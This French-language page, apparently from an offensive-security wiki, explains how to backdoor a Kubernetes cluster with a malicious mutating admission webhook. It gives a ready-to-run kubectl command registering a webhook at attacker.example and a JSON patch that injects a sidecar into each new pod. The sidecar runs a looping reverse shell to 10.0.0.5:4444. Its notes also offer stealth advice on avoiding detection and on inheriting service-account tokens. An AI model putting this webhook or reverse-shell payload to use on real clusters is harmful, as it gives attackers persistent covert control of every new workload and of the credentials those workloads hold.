---
order: 6
title: "Backdoor par webhook mutateur : injection dans chaque objet correspondant"
description: "Un webhook d'admission mutateur réécrit les objets au moment où l'API server les admet. Un attaquant qui en contrôle un injecte un sidecar, un volume ou une variable d'environnement dans chaque pod correspondant, ajoute des identifiants ou des image-pull secrets, ou modifie les security contexts à l'échelle du cluster. Comme il agit à la création, il backdoore automatiquement les charges de travail futures et persiste tant que la configuration existe."
keywords:
  - webhook mutateur
  - mutatingwebhookconfiguration
  - injection de sidecar
  - json patch
  - persistance
---

# Backdoor par webhook mutateur

Un webhook d'admission mutateur peut modifier un objet avant que l'API server ne le stocke, en renvoyant un JSON patch que le serveur applique. C'est ainsi que fonctionnent les injecteurs de sidecar légitimes, et c'est une backdoor puissante : un attaquant capable de créer une `MutatingWebhookConfiguration` pointant vers son endpoint réécrit chaque objet correspondant à sa création. En ciblant les pods, il injecte un conteneur supplémentaire qui établit une balise sortante, ajoute un volume hostPath, définit un security context privilégié ou ajoute son image-pull secret, de sorte que chaque nouvelle charge de travail concernée est backdoorée automatiquement sans toucher aux définitions des charges de travail elles-mêmes.

Nécessite les droits de création sur les mutating webhook configurations :

```bash
kubectl auth can-i create mutatingwebhookconfigurations
```

## Injecter dans chaque nouveau pod

```bash
cat <<YAML | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata: { name: sidecar-injector }
webhooks:
- name: m.attacker.example
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore
  clientConfig: { url: "https://attacker.example/mutate" }
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    operations: ["CREATE"]
    resources: ["pods"]
YAML
```

L'endpoint du webhook renvoie un JSON patch en base64 qui ajoute le conteneur de l'attaquant à chaque pod créé :

```json
[
  {"op":"add","path":"/spec/containers/-","value":{
    "name":"metrics","image":"alpine",
    "command":["/bin/sh","-c","while :; do sh -i >& /dev/tcp/10.0.0.5/4444 0>&1; sleep 60; done"]}}
]
```

Chaque pod nouvellement créé dans le périmètre ciblé exécute alors le conteneur injecté aux côtés de ses conteneurs réels.

## Notes d'exploitation

- Injecter un sidecar est plus furtif que déployer une charge de travail distincte : la backdoor voyage à l'intérieur de pods légitimes, hérite de leur token de service account et de leur position réseau, et apparaît comme un conteneur de plus dans les pods multi-conteneurs.
- Au-delà des conteneurs, le patch peut ajouter un security context privilégié, un montage d'hôte ou un image-pull secret, élargissant l'impact par pod ; limitez le `namespaceSelector` pour éviter les namespaces système si vous voulez rester discret, ou incluez-les pour une portée maximale.
- `failurePolicy: Ignore` maintient la création de pods fonctionnelle lorsque l'endpoint est injoignable, ce qui préserve la santé du cluster et évite une détection liée à une panne.
- Ceci complète l'exfiltration passive des [Webhooks d'admission](admission-webhooks.md) ; l'un capture les objets, l'autre les altère.

## Références

- [Kubernetes: dynamic admission control (mutating)](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#webhook-request-and-response)
- [Kubernetes: admission webhook good practices](https://kubernetes.io/docs/concepts/cluster-administration/admission-webhooks-good-practices/)
